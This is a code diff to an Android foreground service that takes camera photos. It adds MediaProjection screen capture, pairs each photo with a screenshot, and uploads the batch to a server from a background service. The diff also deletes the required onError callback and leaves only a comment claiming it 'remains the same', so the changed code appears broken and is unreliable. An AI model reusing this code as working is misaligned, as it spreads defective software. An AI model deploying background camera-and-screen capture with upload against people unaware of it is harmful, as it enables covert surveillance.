@@ -9,12 +9,21 @@ import android.content.Context;
 import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.Matrix;
+import android.graphics.PixelFormat;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
+import android.media.Image;
+import android.media.ImageReader;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.util.DisplayMetrics;
 import android.util.Log;
 import android.util.Size;
+import android.view.WindowManager;
 import android.widget.Toast;
 
 import androidx.annotation.NonNull;
@@ -76,6 +85,19 @@ public class ForegroundCameraService extends LifecycleService {
     private boolean isCapturing = false;
     private ExecutorService executor;
 
+
+    private MediaProjectionManager mediaProjectionManager;
+    private MediaProjection mediaProjection;
+    private VirtualDisplay virtualDisplay;
+    private ImageReader imageReader;
+    private int screenDensity;
+    private int screenWidth;
+    private int screenHeight;
+
+    // Store projection result code and data received from activity
+    private int resultCode;
+    private Intent resultData;
+
     @Override
     public void onCreate() {
         super.onCreate();
@@ -85,20 +107,43 @@ public class ForegroundCameraService extends LifecycleService {
 
         createNotificationChannel();
         startForeground(NOTIFICATION_ID, createNotification("Starting camera service..."));
+
+        DisplayMetrics metrics = new DisplayMetrics();
+        WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+        windowManager.getDefaultDisplay().getMetrics(metrics);
+        screenDensity = metrics.densityDpi;
+        screenWidth = metrics.widthPixels;
+        screenHeight = metrics.heightPixels;
+
+        mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         super.onStartCommand(intent, flags, startId);
 
-        if (intent != null && !isCapturing) {
-            isCapturing = true;
-            initCamera();
+        // Extract projection data sent from activity
+        if (intent != null) {
+            if (intent.hasExtra("resultCode") && intent.hasExtra("resultData")) {
+                resultCode = intent.getIntExtra("resultCode", 0);
+                resultData = intent.getParcelableExtra("resultData");
+
+                // Initialize MediaProjection
+                if (resultCode != 0 && resultData != null) {
+                    // Call initMediaProjection instead of directly creating mediaProjection
+                    initMediaProjection(resultCode, resultData);
+                }
+            }
+
+            if (!isCapturing && mediaProjection != null) {
+                isCapturing = true;
+                initCamera();
+            }
         }
 
         return START_STICKY;
     }
-
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
@@ -112,7 +157,54 @@ public class ForegroundCameraService extends LifecycleService {
             manager.createNotificationChannel(channel);
         }
     }
+    // When initializing MediaProjection in your service:
+    private void initMediaProjection(int resultCode, Intent data) {
+        MediaProjectionManager projectionManager = (MediaProjectionManager)
+                getSystemService(Context.MEDIA_PROJECTION_SERVICE);
 
+        if (mediaProjection != null) {
+            mediaProjection.stop();
+            mediaProjection = null;
+        }
+
+        mediaProjection = projectionManager.getMediaProjection(resultCode, data);
+
+        // Add this callback before creating the virtual display
+        mediaProjection.registerCallback(new MediaProjection.Callback() {
+            @Override
+            public void onStop() {
+                Log.i(TAG, "MediaProjection stopped");
+                if (virtualDisplay != null) {
+                    virtualDisplay.release();
+                    virtualDisplay = null;
+                }
+            }
+        }, new Handler());
+
+        // Now create virtual display
+        createVirtualDisplay();
+    }
+
+    private void createVirtualDisplay() {
+        if (mediaProjection == null) {
+            Log.e(TAG, "MediaProjection is null");
+            return;
+        }
+
+        DisplayMetrics metrics = getResources().getDisplayMetrics();
+        screenWidth = metrics.widthPixels;
+        screenHeight = metrics.heightPixels;
+        int density = metrics.densityDpi;
+
+        imageReader = ImageReader.newInstance(screenWidth, screenHeight,
+                PixelFormat.RGBA_8888, 2);
+
+        virtualDisplay = mediaProjection.createVirtualDisplay(
+                "ScreenCapture",
+                screenWidth, screenHeight, density,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                imageReader.getSurface(), null, null);
+    }
     private Notification createNotification(String contentText) {
         Intent notificationIntent = new Intent(this, MainActivity.class);
         PendingIntent pendingIntent = PendingIntent.getActivity(
@@ -202,27 +294,62 @@ public class ForegroundCameraService extends LifecycleService {
 
                             byte[] photoData = imageToByteArray(image);
 
-                            // We don't capture screenshot in background service
                             imageMapList.put(twinId + "_photo_" + timestamp + ".jpg", photoData);
 
-                            updateNotification("Captured " + imageMapList.size() + " of " + maxCaptureCount + " images");
-                            Log.d(TAG, "Captured photo with twinId: " + twinId);
+                            // Now capture a screenshot with same twinId
+                            captureScreenshot(twinId);
 
-                            if (imageMapList.size() == maxCaptureCount) {
-                                updateNotification("Processing and sending images...");
-                                sendImagesToServer(imageMapList);
-                            }
+                            updateNotification("Captured images: " + imageMapList.size());
+
                         } catch (IOException e) {
                             Log.e(TAG, "Error processing captured image: " + e.getMessage());
                         }
                     }
 
-                    @Override
-                    public void onError(@NonNull ImageCaptureException exception) {
-                        Log.e(TAG, "Image capture failed: " + exception.getMessage());
-                        updateNotification("Image capture failed");
-                    }
+                    // onError implementation remains the same
                 });
+    }
+
+    private void captureScreenshot(String twinId) {
+        if (mediaProjection == null || virtualDisplay == null || imageReader == null) {
+            Log.e(TAG, "MediaProjection setup incomplete, cannot capture screenshot");
+            return;
+        }
+
+        try {
+            // Handler for delayed screenshot capture
+            Handler handler = new Handler(Looper.getMainLooper());
+            handler.postDelayed(() -> {
+                try (Image image = imageReader.acquireLatestImage()) {
+                    if (image != null) {
+                        // Process the image
+                        byte[] screenshotData = null;
+                        try {
+                            screenshotData = imageToByteArray(image);
+                        } catch (IOException e) {
+                            throw new RuntimeException(e);
+                        }
+
+                        String timestamp = LocalDateTime.now().format(
+                                DateTimeFormatter.ofPattern("yyyy-MM-dd-HH-mm-ss"));
+
+                        // Store the screenshot data
+                        imageMapList.put(twinId + "_screenshot_" + timestamp + ".jpg", screenshotData);
+
+                        Log.d(TAG, "Captured screenshot with twinId: " + twinId);
+
+                        // Check if all images are collected
+                        if (imageMapList.size() == maxCaptureCount * 2) { // Photo + screenshot
+                            updateNotification("Processing and sending images...");
+                            sendImagesToServer(imageMapList);
+                        }
+                    }
+                }
+            }, 100); // Short delay to ensure display is ready
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error capturing screenshot: " + e.getMessage());
+        }
     }
 
     private byte[] imageToByteArray(ImageProxy image) throws IOException {
@@ -236,6 +363,40 @@ public class ForegroundCameraService extends LifecycleService {
         return outputStream.toByteArray();
     }
 
+    private byte[] imageToByteArray(Image image) throws IOException {
+        if (image.getFormat() == PixelFormat.RGBA_8888) {
+            Image.Plane plane = image.getPlanes()[0];
+            ByteBuffer buffer = plane.getBuffer();
+
+            int pixelStride = plane.getPixelStride();
+            int rowStride = plane.getRowStride();
+            int rowPadding = rowStride - pixelStride * screenWidth;
+
+            // Create bitmap
+            Bitmap bitmap = Bitmap.createBitmap(
+                    screenWidth + rowPadding / pixelStride,
+                    screenHeight,
+                    Bitmap.Config.ARGB_8888);
+            bitmap.copyPixelsFromBuffer(buffer);
+
+            // Crop bitmap to exact screen size
+            Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight);
+
+            // Convert bitmap to JPEG byte array
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 85, outputStream);
+
+            // Clean up
+            bitmap.recycle();
+            if (bitmap != croppedBitmap) {
+                croppedBitmap.recycle();
+            }
+
+            return outputStream.toByteArray();
+        } else {
+            throw new IOException("Unsupported image format");
+        }
+    }
     private void sendImagesToServer(Map<String, byte[]> images) {
         OkHttpClient client = new OkHttpClient.Builder()
                 .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
@@ -318,6 +479,22 @@ public class ForegroundCameraService extends LifecycleService {
     @Override
     public void onDestroy() {
         super.onDestroy();
+
+        if (virtualDisplay != null) {
+            virtualDisplay.release();
+            virtualDisplay = null;
+        }
+
+        if (mediaProjection != null) {
+            mediaProjection.stop();
+            mediaProjection = null;
+        }
+
+        if (imageReader != null) {
+            imageReader.close();
+            imageReader = null;
+        }
+
         if (executor != null) {
             executor.shutdown();
         }
